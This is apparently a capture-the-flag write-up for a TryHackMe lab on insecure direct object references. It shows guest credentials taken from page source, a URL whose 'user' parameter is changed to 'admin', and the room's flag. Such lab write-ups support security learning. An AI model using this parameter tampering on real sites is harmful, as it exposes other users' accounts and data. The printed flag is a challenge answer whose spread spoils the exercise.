LINK: https://tryhackme.com/room/neighbour  
AIM: To understand the "IDOR" Vulnerability

After starting the machine,open the webpage http://$IP ,and login as guest:guest (already provided in the source code of the webpage)  

Now,Notice the URL:

```
http://10.10.2.247/profile.php?user=guest
```  

There is a parameter named 'user'  

and it has been set to 'guest' change the value to 'admin'  

```
http://10.10.2.247/profile.php?user=admin
```  

and get the FLAG!  

```
flag{66be95c478473d91a5358f2440c7af1f}
```  
